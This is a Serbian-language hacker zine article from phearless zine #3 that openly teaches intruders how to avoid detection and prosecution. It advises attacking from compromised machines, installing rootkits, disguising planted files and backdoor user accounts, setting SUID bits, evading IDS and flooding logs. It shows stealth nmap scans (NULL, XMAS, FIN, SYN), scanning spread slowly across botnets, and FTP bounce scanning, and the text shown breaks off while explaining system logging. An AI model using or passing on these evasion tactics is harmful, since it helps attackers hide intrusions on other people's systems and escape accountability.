                               
                              ...................
                        ...::: phearless zine #3 :::...                       

......................>---[ How to stay OUT of JAIL ]---<.......................

......................>---[  -Covering YOUR tracks- ]---<.......................

..........................>---[ by _bl00dz3r0_ ]---<...........................
                                                     blood.ugs[at]gmail[dot]com 


  >=----

  [0x00] %  OOOOh not again!
      <0x00a> It is I blood!
      <0x00b> Acknow$#@(@
      <0x00c> Sources
      <0x00d> ...

  [0x01] %  Basic tehnics
       <0x01a> General Tips
       <0x01b> Ghost scanning
       <0x01c> Bounce scanning
 
  [0x02] %  Its all about Logging
      <0x02a> Yes it is!
      <0x02b> klogd
      <0x02c> syslogd
      <0x02d> Shell logging
      <0x02e> Other logging
       
  [0x03] %  WIPEOUT!!!
      <0x03a> UTMP
      <0x03b> WTMP
      <0x03c> Clear!!!
      <0x03d> xFERlog
      <0x03e> SULOG
  >=----
  
//////////////////////////////////////////////////////////////////////////////// 
--==<[ 0x00 %  OOOOh not again!
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
      
  
   ==-[ 0x00a %  It is I blood!


 -=Winners dont use drogs=-
 -= I do! So am i looser =-
 -= (samo lake droge :>) =-

  Yeap its me again :> po treci put.
Znam da ste navikli i da ste ocekivali neki dinosaurus txt ali njah nista od toga.
A zasto? Zato sto dugi tektovi znaju da smore :> cak i kad se napusis :> E onda 
mos misliti kako je to zamorno. Zato sam odlucio da skratim ja malo moje pripreda-
nje za jedno 2/3 :> Tako je najpametnije, a i najlakse.
Ovaj tekst ce biti znatno kraci od dva prethodna, ali ce nadam se biti mnogo vise
jasniji i laksi za razumevanje. Tema je ne samo interesantna vec PREKO potrebna
za svakog ko je u ovim vodama... Naslov zvuci zanimljivo zar ne ?
Ajde vi svi okoreli krimosi tutanj ovde necete naci nista pomocu cega se mozete
izvuci iz govana :> jelte jel ovo je cisto tekst koji vam moze pomoci da se izvu-
cete od ovih akerskih sranja. Dajte kao da niko od vas nikada nije pomislio kako
bi bilo COOOL da FBI bane u sobu specijalci oko kuce opsta halabuka joj ....nov-
inari vas slikaju, dajete intervijue picke se loze bacaju tange na vas , mlada 
pic(#@$)@ ....dosta to je neki drugi film :>
  ELem posle golemog uvoda u fingerprinting i malo zalaska u vode fw vreme je da
naucimo nesto korisno :>
Sala na stranu zaista ostati van zatvora ili makar bez nekog kaznenog rada je sada
veoma bitno kada se u u ovoj nasoj krsh zemlji nesto desava po tom pitanju.
Naime kobejagi je uveden neki zakon za te aktivnosti :> pih
Iako od toga nema nista al ajde kao zamislite da je ovo zemlja bez korupcije i zem-
lja zakona i vi sada treba da obezbedite sebe na taj nacin da vas nemogu navatati.
To je poenta ostati sto posto anoniman pri svakom vasem malom delu.
  Jel nije lepo da posle nekih nelegalnih aktivnosti zaglavite corke sa svim onim
pederasima pa da im dovatate sapune :>
Mislim da je svakom u cilju da nedodje do doticnih scena iz krimi filmova :>
Najvaznije od svega je uredno brisati sve __log__ fajlove o cemu ce u ovom tekstu
i biti najvise reci. To je jedna nezaobilazna tema u zivotu svakog da nekazem hakera.
Poznavati mehanizme za logovanje i nacin rada je isto toliko bitno kao i znati resiti
se na pravilan nacin istih.
U tekstu ce biti reci o UNIX sistemima za logiranje, zatim o nacinu na koji se logovi
spremaju, kako se mozete resiti logova, kako slati bezbedan mail i jos dosta stvari
sve u cilju zastite i anonimnosti.
  Tutorial cemo poceti lagano sa nekim generalnim savetima nastaviti sa prvom fazom
svakog uspesno ili neuspesnog upada u sistem -skeniranja. Ali skeniranja kojim necete
otkriti kako sebe tako i svoju nameru. Cilj je ostati nevidljiv i neprimecen kako 
bi se resili vise problema o kojima cemo kasnije.
  Pricacemo o logovima ponajvise i kako ih se efikasno resiti (ne nije reklama :> )
i bla bla
 ...bice tu svega i svacega.
  Ovo nije naravno kompletan prirucnik koji ce vas nauciti svemu i svacemu jel ja za
to vala nemam vremena, a i niko me neplaca za to jelte. Trudicu se da budes sto jas-
niji i koncizniji kada je ova tema u pitanju i da vas uputim na pravi put kako bi os-
tali na slobodi (makar za neko vreme). 
Ostalo je na vama da li cete savete prihvatiti ili cete juriti za slavom :>

DODATAK:

Tekst je opet dinosaurus ...a sta ces kda volim da pisem i kad sam se raspisao pa
reko "ajde IZBACI DECO TO IZ SEBE mozes ti to " :>



   ==-[ 0x00b %  Acknow$#@(@

  NIKO mi nije pomogao u izradi ovog teksta smrc :(((, ali voleo bih da pozdravim
sve koji me znaju i bla bla da spasem svet zelim mir u svetu... :>
Spisak ljudi koje bih zeleo da pozdravim i da napljujem. Moze da pozdravi koj koga
'oce :>

    +------------------------------------------------------+
    |                                                      |
    |  sh0utz to:                                          |
    |  Pinky_JSO,Gale,Bane Svaler,pop,tofila,misko,n4rk0   |
    |  Nitro_ACID,dEMO,Panker,Sindel,ggandalf,BadBoy,Hari  |
    |  Poter aka Stevic aka Hibrid,kermit,ana,nada,sanja,  |
    |  marija,alexandar iz bogatja kod belotja,modche,},   |
    |  existenz,teryon,pawwa,Mil0s,backspace,Exoduks,ckayt |
    |  sunnis,nimr0d ...milo2pac,root destroyer...         |
    |  #ugs i blaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   |
    +--------------------            ----------------------+
    |                                                      |
    |  spec shoutz goes to:                                |
    |  svim memberima Blackhatz [dot]                      |
    |  net, pariz klubu :>, svom sljamu iz majura...i      |
    |  za Semsu dokako i Floresitu :> i najveceg cara na   |
    |  ircu DJ_MY_SOULA iduceg kevina mitnika :>           |
    |                                                      |
    |  A bash poseban pozdrav za "mi futuru esposu"        |
    |  kissssssss :>                                       |
    |                                                      |
    |  shitz to:                                           |
    |  normalnu-trazim xexe - "Nikada neces porasti mali   |
    |                          veseljace"                  |
    |  lejmu na ES, has-no-life markomu, smoru alex-u      |
    |  glupoj-em-ruznoj-ciciki, filozofu bojanu basicu,    |
    |  glupom-ruznom-retardiranom-napusenom dwarfu byte-   |
    |  fishu (megabyte me) i tako ima toga jos spisak se   |
    |  nastavlja...hulio albertooo seljacina jedna nece    |
    |  floresitu :>  prava GOVNA IZVINTE na poredjenju     |
    |                                                      |
    |  p.s.                                                |
    |  Umal da zaboravim poseban pozdrav Gojku koji nam je |
    |  omogucio mnogo trenutaka kvalitetne zabave i sprd-  |
    |  acine...bad bad coder :> down boy down!!!           |
    |                                                      |
    |  p.s. 2                                              |
    |  Gojko we still read your e-mail                     |
    +------------------------------------------------------+
    +------------------------------------------------------+
    +------------------------------------------------------+

Thats all folks. (skraceni spisak)


   ==-[ 0x0c %  Sources

  Mahhhh ovo nisu sourcevi programa niti kodovi vec literatura koja mi je pomagala
da sto bolje proucim temu o kojoj sam pisao. Nadogradjivanje znanja svaki dan je
preko potrebno ukoliko zelite da ostane up2date sto bi rekli. Svakodnevno pracenje
vesti iz sveta IT citanje razne strucne literature pomoce vam da sazrelite u ovom
okrutnom svetu IT industrije :>
Knjige, tutoriali i ostale reference koje sam koristio su tu samo kao ispomoc u 
ucenju i radu, a ne kao sredstva za copy/paste funkcije...

  [=- My beautiful mind
  [=- www.google.com
  [=- Linux Security CookBook
  [=- Internet and UNIX Security
  [=- Hacking Exposed
  [=- Linux System Administration
  [=- How_To_Make_Anyone_Fall_In_Love_With_You_

and so on...


   ==-[ 0x0d %   ...

....zna ona koja je :>  


//////////////////////////////////////////////////////////////////////////////// 
--==<[ 0x01 %  Basic Tehnics
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


   ==-[ 0x01a %  General Tips

  
  Pocecemo sa nekom osnovnom diskusijom o tome kako biste prikrili svoje tragove
tj ostali anonimni. Kada pricam o toj temi ona se ne svodi na to da ostanete ano-
nimni na nekom porno sajtu ili sl vec se radi o anonimnosti i zastiti sopstvenog
integriteta vas kao napadaca i uljeza u racunarskom sistemu. I pre samog cina 
provale treba se obezbediti maksimalno kako bi postojale sto manje sanse da kada
provalu izvrsite ostavite tragove. Sto manje tragova manje sanse da admin sistema
sazna odakle napad potice...i manje sanse da zaglavite tvorza :>
  Mozete slediti par saveta koje cu vam dati i koji bi predstavljalo bednu osnovu
koja vam nemoze pruziti neki ekstra osecaj sigurnosti ...
Kasnije cemo se pozabaviti glavnom stvari tj brisanju logova.

  Na prvom mestu to je masina sa koje vrsite upad. NIkada ali nikada ne treba bilo
kakvu vrstu napada ili sl vrsiti sa kucnog racunara i sa svog ISP. To je nesto
najgore sto moze da vam se desi. Tragovi koje ostavite na taj nacin npr u logovima
ISP su validni i na sudu bez obzira sto mogu biti namesteni na vise nacina.
Takodje par query i sposoban admin sam moze doci do vaseg IP i podataka o vama.
Timestamps i ip skenova moze lako biti upotrebljen dokaz protiv vas.
Jedna od cesto zastupljenih "ispala" mladih nalozenih hakerasa je sistem ili bolje
reci sindrom dinamicke ip adrese.
To se svodi na sledece:
Ukoliko napravim neko sranje jednostavno cu da se rekonektujem posle pola sata
dobijem novu IP i ko ce znati da sam to ja? Naravno da ce znati jel ce u logovima
ISP ostati zabelez svaki vas izlazak na internet, vas broj telefona ,a u ISP vec
imaju sve vase licne podatke.Zbog toga nista vam ne vredi bezati na taj nacin i
ulivati sebi neki lazni osecaj sigurnosti da ste posle rekonekta i promene ip 
sigurni.
  Koriscenje javnih shellova moze biti takodje dvosekli mac...Zamislite scenario
otvorite nalog na nekom shellu i krenete da sa njega arcite neciji box. U logovima
ce ostati ip/host shella sa koga lansirate napad ali ne vas originalni ip. I vi
naravno mislite da ste sigurni jel admin boxa nece videti vas ip vec shell pa ko 
ga jebe :> Ali isti taj admin ako je iole znalazljiv otvorice/dobice pristup na
isti taj shell server sa koga se i vi kacite i jednostavnim upitom za logovanim
korisnicima (#w,#who,#finger) ...saznati odakle se kacite i ko ste.
  Jedna od retkih "sigurnih stvari" jeste lansiranje napada sa rootanih masina 
posebno sa onih kao sto su game serveri gde admini gotovo i ne obracaju paznju.
Instaliranje kojekakvih rootkita u cilju vaseg sakrivanja od sys admina je preko
potrebno.
Pa kako onda ostati neotkriven?
To je tezak odgovor i zahteva pored znanja i vestine malu dozu maste...
Jedan od resenja je koriscenje shellova na drugim masinama bilo hakovanim ili sl.
Naravno brisanje logova i ostalih podataka koji vas kompromituju se podrazumeva.
Znaci definitivno resenje za vas je imati sto vise rootanih masina i mozete
bouncati konekcije. Jedno od resenja je spoofati neciju ip i raditi posao :>


Proksi serveri su takodje dobra stvar medjutim treba naci pouzdane i dobre proksije
ili dici svoje na rootanim masinama. Ukoliko ste u tim vodama bolje za vas da nigde
ne ostavljate svoju real ip ...znaci gde god se pominje vase ime,nick i sl koristit
proki servere...na news grupama forumima itd. 
  U sledecem odelju cu opisati kako izvrsiti skeniranje mete ali bez da je alarmirate
bez da ostavite neke velike tragove i sl. Jel nije cilj da se meta uzbuni odmah i da
vidi vase namere vec da admin sto duze vremena zivi u neznanju da ga neko posmatra.
Kada se upad vec desi onda je sve na znanju i na masti jel postoje desetine nacina
na koje mozete prikriti vase prisustvo na sistemu.
svakom adminu ce privuci paznju preterano opterecivanje sistema nego normalno
sto mu je prvi znak da je uljez unutra i radi neke nedozvoljene stvari.
Vodite racuna da kao napadac ne uzurpirate standardne procese ili servise jel ce 
vas admin zapaziti sigurno. Veoma losa ideja je na cuvanom sistemu postavljati
softver kakvi su snifferi pass crackeri itd. Pogotovu zato sto pass crackeri trose
veliku kolicinu snage CPU pa smesta upadaju u oci. I Kada morate bash da postavite
koristite __NICE__ i __RENICE__ kako bi setovali prioritete.
Na mrezama na kojima znate da je admin "sa jeftinijom ulaznicom" mozete se igrati.
  Takodje nikada ne uploadajte i ne smestajte na HD velike fajlove jel su uocljivi.
Imenovanje fajlova poput crack,h4x0r,backdoor,asmtrojan je veoma lose. Bolje
je fajlove nazvati nekim imenima vezanim za sys internals npr kernel_img i sl
i smestati ih u dirove u koje se najmanje zalazi i koji nisu u PATH-u.
Smestajte npr u /usr/share/ i sl....
Vazno je da nikada ne rebootate masinu ili nedaj Boze da je ugasite jel to ce odmah
dati na znanje da se nesto sumnjivo dogadja na sistemu. Jel Linux nije win pa da
se reboota iz cista mira.
  Ne otvarajte previse fajlova u istom trenutku jel admin sa __LSOF__ komandom
u svakom trenutku moze saznati koji su fajlovi otvoreni. Veliki je broj fajlova
i po defaultu zato ne izazivajte sumnju novim.
  Sposoban sys admin ce gledati jos neke stvari:

  [=-  Missing process  -  Naprasno nestale procese...
  [=-  Dodatne procese  -  Ovo je najcesi slusaj jel admin moze videti
                           sve pokrenute procese na sistemy medjutim 
                           lako im se moze doskociti koriscenjem rootkita
                           i sl alata....
  [=-  CPU Time         -  Ukoliko procesi trose vise CPU resursa nego sto
                           je to bio obicaj pre , moze znaciti da je program
                           backdoorovan ili sl i da pored svog default posla
                           obavlja jos neki skriveni.
  [=-  UID procesa      -  Admin moze gledati UID procesa i ukoliko ga smatra
                           nepoznatim ili vidi da je menjam lako cete ga
                           alarmirati. Nikada ne menjajte UID poznatih 
                           procesa.
  [=-  Fajlove          -  Admin ce uvek gledati dosta stvari vezano za fajlove
                           tipa, velicinu fajla,permove,atribute itd.


  Vazno je znati da sve ove probleme admini ne resavaju  rucno tj peske vec da za 
ovo postoje vec automatizovani alati koji se zovu IDS (Intrusion Detection System)
koji su najbolji adminovi prijatelji. O IDS cemo drugi put mozda :> jel ovo nije
tekst o funkcionisanju istih...Sve operacije alat tipa SNORT ce resiti mnogo bolje
nego admin manuelno stotine provera se mogu izvrsiti i detektovati se provalnik.
Zato cuvajte se IDS :>

  Jos svega par napomena. Nikada na osvojeni server ne smestajte nesto poput wareza ili
nedaj boze muzike ili pornica...to ce vam se sigurno odbiti od glavu i lako cete biti
uhvaceni.Lako ce te pojesti sav prostor na hardu ili pojesti bendvich sto nece sigurno
proci nezapazeno. Admin u svakom trenutku moze ukucati #netstat -na ili #lsof -i i 
videti otvorene konekcije.


   ==---------[code]----------==
   bloodzero@c0re:~$ lsof -i
   COMMAND   PID      USER   FD   TYPE  DEVICE SIZE NODE NAME
   BitchX   7846 bloodzero    4u  IPv4 4071640       TCP    ns1.blackhatz.net:47708->ev1s-67-15-49-82.ev1servers.net:ircd (ESTABLISHED)
   BitchX  26413 bloodzero    4u  IPv4 4071639       TCP    c0re.blackhatz.net:34379->ev1s-67-15-49-81.ev1servers.net:ircd (ESTABLISHED)
   ==---------[/code]---------==

U ovom primeru jasno vidimo da sam uspostavio konekciju sa ev1s-67-15-49-81.ev1servers.net: tj sa irc.krstaricom koja se nalazi na doticnom.

Naravno da postoje i tehnike uz pomoc koji vas netstat nece videti ali kasnije cu 
dati primer iz tog podrucja.


Ukoliko cete nove rootane masine koristiti za daljnje hakove morate biti svesni toga
da admin nove mete moze kontaktovati pravog administratora i upozoriti ga da se napadi
vrse upravo sa masine koju on administrira. Time cete uspeti da alarmirate admina i
da ga navedete da izvrsi detaljniju istragu sistema.
  Vec sam napomenuo za sniffere da ih ne postavljate na mestima gde su admini iole
snalazljiviji. Kada admin koristi sledecu komandu:


   ==---------[code]----------==
   bloodzero@c0re:~$ ifconfig -a
   eth0      Link encap:Ethernet  HWaddr 00:21:11:33:9E:11
          inet addr:69.60.123.15  Bcast:633.11.23.255  Mask:255.255.252.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:46984034 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18512768 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:536603961 (511.7 MiB)  TX bytes:1854212781 (1.7 GiB)
          Interrupt:23 Base address:0xec00
   ==---------[/code]---------==

...i ukoliko ugleda PROMISC parametar u izlazu znace da je napadac bio tu. U krajnjem
slucaju izvrsice pretpostavku. Jel kada adapter radi u ovom rezimu on skuplja sve
pakete sto koriste vrcina snifferi.
Ne budite lamer i ne brisite cele logove vec ih editujte rucno medjutim o toj temi
cemo znatno vise kasnije govoriti.
Nikada ne dodajte nove usere na sistem niti postojecim menjajte passove jel to je
prvo na sta admini gledaju kada se radi o provali.Ukoliko morate (a ne morate) da
dodate nove usere  uradite to na sledeci nacin:

  [=- Dodelite im ime koje je slicno vec nekom postojecem useru
      npr: Ukoliko na sistemu postoji user sanja vi dodajte sanjaa
      medjutim nemojte misliti da ste nevidljivi :> Takodje i licne 
      podatke promeniti u originalne.

  [=- Dodelite ime novom useru da podseca na neke servise/daemone
      npr: sysop,telnetd,mailer i sl

  Uglavnom razmisljajte kao admin sta bi bi uradili da ste na njegovom mestu.
Probajte da nekim programima date SUID bit sto ce vam olaksati posao kada imate
prava samo obicnog usera (npr ako admin primeti da imate root akaunt a ne primeti
da imate obican nalog).

itd itd postoje stotine nacina :>
Postanite deo sistema i nevidiljivi ste :>






   ==-[ 0x01b %  Ghost scanning


  Svako osvajanje sistema pocinje sa skeniranjem i popisivanjem. O Tome sam doooooosta
pricao u prvom broju ph zine-a tako da se necu zadrzavati da vam objasnjavam poj-
move vezane za ovu tematiku nadam se da sam bio jasan u prvom tutoru.
Ali nije nam cilj sada dobiti sto vise informacija o ciljanom sistemu vec ostati
nevidljiv. Drugim recima zelimo da izvrsimo skeniranje sistema ali da ne alarmiramo
sysadmina ili neki IDS i slican softver. Mislim naravno i dalje zelimo da saznamo
neke podatke koje se ticu mete :>
  Nikada ne skenirajte sa svog ISP accounta sa svoje masine i sl kao sto sam vec
pomenuo jel vas to stavlja u nezgodan polozaj. Instalirajte skenere na tudjim sis-
temima na rootanim boxevima i opletite.
Prikriveno skeniranje se moze izvrsiti na vise nacina:

  [=-  NULL   -  Paketi se salju bez flagova
  [=-  XMAS   -  ACK/SYN/RST kombinovano
  [=-  FIN    -  Veoma slicno SYN/ACK
  [=-  SYN    -  Half Open scaning

Medjutim ukoliko je admin dobro setovao IDS i FW morate se zaista pomuciti da
dobijete neki response od porta ili servisa a pogotovu da ostanete sto posto
nevidljivi. 
Kod skeniranja portova veoma vazno je da sken vrsite u sto manjem range portova
i sa razlicitih ip adresa. Tj npr sa jedne ip adrese skenirajte od 1 do 20 portove
sa druge od 20 do 40 i tako dalje i to sa sto vecim deley izmedju skeniranja 
portova kako ne bi izazvali sumnju.
Mozemo npr sa 1000 botova da postavimo da svaki skenira po jedan port u rasponu od 3
minute sto definitivno ne bi smelo da alarmira IDS, ali opet zavisi kako je podesen
sam IDS.
 Ideja je da nikako ne zelimo da ostvarimo three way handshake tj potpunu 
TCP konekciju da ne bi uznemirili logovove IDS i sl.
Vecina "hack alata" kace se na svaki port i uspostavlja potpunu vezu sa portom.
Time ste zavrsili sa karijerom :> sto se tice tog sistema.
Moramo koristiti naprednija skeniranja kako bi ostali van zatvora :>
Ukoliko zamisljate da saljete RAW pakete sa nekog sistema na kom imate shell
samo necete biti bash u mogucnosti da izvrsite tu akciju jel na vecini sistema
raw pakete moze praviti samo root jel je obicno setovano uid 0 na 
/dev/bpf SOCK_TRAW itd.


   
   ..[=-< NULL scan
   .
   .
    

  Prvo cemo malo popricati o NULL skeniranju, a zatim i o ostalim tipovima 
stealth skeniranja.
Da napomenem da cemo sve ove skenove izvesti uz pomoc popuolarnog alata nmap
(www.insecure.org).
Cela ideja oko NULL skeniranja se svodi  na to da paketi odgovaraju na probe
pakete sa RST paketom dok otvoreni odbijaju paket.
Kod NULL skeniranja svi flagovi se iskljucuju.



   ==---------[code]----------==
   root@fearless:~# nmap -sN 127.0.0.1
   Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 
   Interesting ports on localhost (127.0.0.1):
   (The 1658 ports scanned but not shown below are in state: closed) 
   PORT     STATE SERVICE
   6000/tcp open  X11
   Nmap run completed -- 1 IP address (1 host up) scanned in 1.644 seconds
   ==---------[/code]---------==



   ==---------[code]----------==
   [192.168.0.1]  [192.168.0.1]  TCP: D=438 S=36860     WIN=4096
   [192.168.0.3]  [192.168.0.8]  TCP: D=36860 S=438 RST ACK=2135565682 WI

   [192.168.0.1]  [192.168.0.3]  TCP: D=110 S=36860     WIN=1024    - otvoren  
   ==---------[/code]---------==

Kao sto smo videli u ovom primeru kada je odgovoreno na zahtev sa RST paketom
znamo da je port zatvoren...u drugom slucaju paket se nije vratio sto znaci
da je port otvoren.


   
   ..[=-< XMAS scan
   .
   .

xmas treee salje TCP frame sa URG PUSH i FIN flagovima setovanim
ime je dobilo po tome sto su altermating bits ukljucuju i iskljucuju u flag byte
00101001 kao svetla na jelci novogodisnjoj.
zatvoreni portovi odgovaraju sa RST kao i kod NULL skeniranja.
posto nigde nema uspostavljanja TCP sesija nebi trebalo da budu zabelezeni u logovima.
prenose se samo dva paketa od kojih je jedan frame to je sve sto treba.
medjutim m$ stack drugacije ih renderuje pa ce vam prijaviti sve porotve closed
neki OS vam ogranicavaju odredjeni broj RST paketa



   ==---------[code]----------==
   root@fearless:~# nmap -sX 127.0.0.1
   Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 
   Interesting ports on localhost (127.0.0.1):
   (The 1658 ports scanned but not shown below are in state: closed) 
   PORT     STATE SERVICE
   6000/tcp open  X11
   Nmap run completed -- 1 IP address (1 host up) scanned in 1.644 seconds
   ==---------[/code]---------==



   ==---------[code]----------==
   [192.168.0.8]  [192.168.0.7]  TCP: D=618 S=36793 FIN URG PUSH SEQ=3378228596 LEN=0    WIN=1024
   [192.168.0.7]  [192.168.0.8]  TCP: D=36793 S=618 RST ACK=3378228596 W

   [192.168.0.8] [192.168.0.7]  TCP: D=79 S=36793 FIN URG PUSH SEQ=3378228
   ==---------[/code]---------==


-tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,RST,PSH,ACK,URG
Je flag sequence za XMAS.

   ..[=-< SYN scan
   .
   .


imamo SYN scaning tj half open scaning
nikada se skroz ne uspostavlja konekcija TCP
SYN scan salje samo SYN paket i ceka SYN ACK ili RST da vidi je open port
neki ga logeri i sl ne detektuju kao scan
ovo zahteva ispravku paketa i pristup SOCK_RAW (getprotbyname('raw'); znaci root

fw ce lako detektovati syn scan
mozemo probati na npr poslati ACK paket
i ako je ttl vracenog paketa manji nego u ostatku RST paketa
ili ako je windows size veci od 0 onda je open port
slow scan--
skeniranje se vrsi sporo dosta je naporno ali tako mozete izbeci nezeljene
logovanja
tesko ih ja uvideti na automatski nacin posto moras uzeti celu istoriju 
svih paketa koje si primio u nameri da detektujes nove pakete koji su vezani
za stari saobracaj.



Sada problem je ukoliko na ciljanom sistemu runuje neki IDS ili npr PortSentry.


   ==---------[code]----------==
   nmap -sT 10.0.0.10
   ==---------[/code]---------==

TCP scan puna konekcija ako se  konektuje na port otvoreno ako ne closed
onda se konekcija gasi da ne bi doslo do SYN flooda mete

ukoliko je na meti npr aktiviran PortSentry mozete videti ovakav izlaz

Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-10-07 17:54 EDT
Interesting ports on 10.0.0.10:
(The 1634 ports scanned but not shown below are in state: closed)
PORT STATE SERVICE
1/tcp open tcpmux
11/tcp open systat
15/tcp open netstat
22/tcp open ssh
79/tcp open finger
111/tcp open rpcbind
119/tcp open nntp
143/tcp open imap
540/tcp open uucp
631/tcp open ipp
635/tcp open unknown
1080/tcp open socks
1524/tcp open ingreslock
2000/tcp open callbook
6000/tcp open X11
6667/tcp open irc
12345/tcp open NetBus
12346/tcp open NetBus
27665/tcp open Trinoo_Master
31337/tcp open Elite
32771/tcp open sometimes-rpc5
32772/tcp open sometimes-rpc7
32773/tcp open sometimes-rpc9
32774/tcp open sometimes-rpc11
54320/tcp open bo2k

Nmap run completed -- 1 IP address (1 host up) scanned in 2.960 seconds


sada portsentry slusa na svkaom portu tj salje zahteve za to stacku dobija listu porotva i slusa na svkaom
kada stigne zahtev konekcije na taj port stack prosledjuje portsentry.
Jednostavno ovo ce nas zavarati.



   ..[=-<FIN scan
   .
   .

  Ovaj nacin skeniranja koristi __inverse-mapping__ da otkrije zatvorene portove.
Kada se jednom paket sa FYN flagom posalje zatvoren port odgovara sa RST bitom.
Otvoreni port ne odgovara nista ..sve to zahvaljujuci losem BSD kodu :> misli se na
mrezni kod koji cini vecinu stacka kod OS.
FIN scan mozete izvesti uz pomoc nmapa i to koriscenjem -sF switcha.


   ==---------[code]----------==
   root@fearless:~# nmap -sF 127.0.0.1
   Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 
   Interesting ports on localhost (127.0.0.1):
   (The 1658 ports scanned but not shown below are in state: closed) 
   PORT     STATE SERVICE
   6000/tcp open  X11
   Nmap run completed -- 1 IP address (1 host up) scanned in 1.644 seconds
   ==---------[/code]---------==




   ==-[ 0x01c %  Bounce scanning

  Jedan dobar savet koji vam mogu dati jeste da trazite sto vise vuln masina kako bi
kroz njih bouncovali vase napade tj usmeravali kroz njih napade na druge sisteme.
Ovakva vrsta napada uzima prednosti ranjivog FTP protocola koji ima podrsku za
proxy FTP konekcije.
Naravno sve opet u cilju skrivanja odakle dolazite tj odakle napad potice.
Tako da mi sada mozemo iskoristiti ove ranjivosti i izvrsiti TCP skeniranje 
kroz proxy FTP server. Ti se mozes konektovati na FTP server koji se nalazi iza
firewalla i onda mozemo skenirati portove.
Ukoliko FTP server dozvoljava citanje i pisanje po nekom diru mozes poslati
arbitrary data portovima koje nadjes otvorene. 




//////////////////////////////////////////////////////////////////////////////// 
--==<[ 0x02 %  Its all about Logging
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\  



   ==-[ 0x02a %  Yes it is!

  Kao sto rekoh jes it is.
Cuvanje logova je veoma vazan aspket kompjuterske sigurnosti.
Logovi vam nemoraju sluziti samo npr da pratite napadaca do njegovog izvora vec i da resite mrezne probleme rupe u programima itd. Npr vrlo lako mozete videti zarazene sisteme u mrezi.
Svaki sposoban sysadmin ce saznati sve sto mu treba iz logova. Ma verovatno ste
culi na ircu
-Brate brisi logove kada haknes masinu
-Nisi valjda ostavio logove
-Modifikuj logove
i sl....

  To vam je to.Morate paziti takodje da admin ne smesta logove negde remote jer to
je mozda i jedini siguran nacin sa kojim ce sacuvati logove.
Logovi mogu biti tretirani na sudu kao cvrst dokaz protiv pocionioca krivicnog dela.
  Medjutim kao sto rekoh ne koriste se logovi iskljucivo iz sigurnosnih razloga vec i
iz drugih. Npr ponekad zelite da znate sta se desavalo tokom boota sistema.
Najednostavnije vam je da pogledate /var/log/dmesg fajl u kom se smesta output kernel
ring buffera. Istu stvar mozete uraditi pokretanjem komande dmesg (/bin/dmesg).
Postoji citav niza log fajlova koji se nalaze u /var strukturi direktorijuma i
koje svaki ponaosob mozete ispitati.
Veliki problem koji postoji kod proucavanja logova jeste taj sto jednostavno postoji
ogroman broj podataka i sad medju tom gomilom junka treba izdvojiti bash ono sto 
adminu treba. Ponekad mozete racunati na to i zatrpati loger nekim smecem kako bi
adminu bilo sto teze da pronadje ono sto ga zanima.
Admini cesto smatraju da je veoma vazno da svoje korisnike prate lokalno cisto da bi
bili svesni da su njihove akcije pracene i da vode racuna sta rade.
  Znaci log fajlovi su samo jedna cigla u izgradnji jedne tvrdjave od sistema i kao takve
ih treba tretirati kao vema kompromitujuce po napadaca. Admin moze revizirati ceo tok
napada kroz logove i napraviti jednostavan grafik gde je sta uradjeno.
UNIX je sve ovo zakuvao jel je bio multiuser i time sharing OS. Pa je bilo potrebno voditi
zapise o svakom useru kada se prijavljuje i sta radi. Medjutim ovo je preraslo u nesto
mnogo vise tako da danas iz logova mozemo saznati gomile stvari.
Logovi na unix sistemima se smestao u razlicite direktorijume. Najcesce su to:

  [=- /var/log
  [=- /var/adm

Vecina log fajlova su plain-text fajlovi koji e pisu liniju po liniju od strane systemskih
programa.
Navescemo neke osnovne log fajlove koje bi trebalo da znate sta predstavljaju i sta se
u njih smesta kako bi bili sposobni da iste editujemo u nase svrhe.

  [=- /var/account/acct  -  process accounting
 
  [=- aculog             -  logovanje dial-out modema
  
  [=- astlog             -  zadnje uspesno/neuspesno logovanje usera
 
  [=- loginlog           -  belezi neusple pokusaje logina

  [=- secure             -  Poruke koje proizvodi syslog ali zahtevaju ekstra
                            privatnosti. Obicno poruke koje se loguju sa AUTH ili AUTHPRIV 
                            mehanizmima koji obicno sadrze passove.

  [=- sulog              -  Loguje koriscenje SU komande (veoma vazno)

  [=- utmpx              -  Ovo je Extended UTMP

  [=- wtmpx              -  Extended WTMP

  [=- vold.log           -  loguje greske spoljasnih uredjaja tipa cdrom i sl.





   ==-[ 0x02b %  klogd


  Klogd je poznati Kernel Log daemon. To je daemon koji presrece i loguje Linux
Kernel poruke. On te poruke salje odgovarajucim fajlovima,userima ili socketima.
Kernel ima svoj sopstveni logging API.
User-land syslog poziv (call)  je obezbedjen preko funkcije kernela __sys_syslog__
. Kernelov syslog poziv se zove __PRINTK__. Posto Kernel treba da bude sto manji
fleksibilniji jednostavniji kako bi oduzimao sto manje memorije njegov sistem logo-
vanja je jednostavniji nego kod sysloga. Kod sysloga imamo tzv "facility system"
tj koncept sto kod klogd nemamo. Logovi su jednostavni tekst stringovi kojima pret-
hodi nivo prioriteta. Taj nivo prioriteta je broj koji se nalazi izmedju strelica
<>  i nivo prioriteta se krece od najnizeg 7 do najveceg 0.
  Kada se desi protection fault u logove se zapisuje i memorijska adresa.
Medjutim u novijim kernelima gde postoje veliki broj poruka memorijske adrese se
obavezno zapisuju.
U linuxu se nalaze dva izvora kernel log informacija /proc fajlsistem i vec pomenuti
sistemski poziv sys)syslog. Sam Kernel odlucuje koji ce koristiti medjutim sa -s
switchom vi mozete naterati klogd da informacije skuplja iz sistemskog poziva.
KLOGD prvo gleda da li je /proc mountovan i ukoliko jeste gleda fajl /proc/kmsg
